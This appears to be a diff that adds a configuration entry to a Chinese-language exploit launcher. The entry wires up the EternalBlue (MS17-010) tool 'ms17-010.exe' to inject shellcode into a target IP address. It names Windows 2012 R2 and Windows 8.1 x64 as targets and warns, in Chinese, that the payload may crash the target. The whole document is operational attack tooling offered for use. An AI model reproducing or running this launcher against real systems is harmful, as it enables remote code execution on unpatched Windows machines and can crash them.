@@ -1,0 +1,18 @@
+<sfjt>inject</sfjt>
+<ljfs>NB</ljfs>
+<sctype>yuan</sctype>
+<cs1mc>IP地址</cs1mc>
+<zbz>1</zbz>
+<bz1><cmd>ms17-010.exe <cs1/> <sc/></cmd></bz1>
+<bz1fk>Eternalblue for Windows 8 and 2012 is ready!</bz1fk>
+
+<bz>Target:
+
+- Windows 2012 R2 x64
+- Windows 8.1 x64
+
+注意:
+
+这个buffer有可能会失败或者造成目标系统崩溃！！
+仅仅支持以上Target所示版本的 x64(64位) 操作系统！！
+</bz>
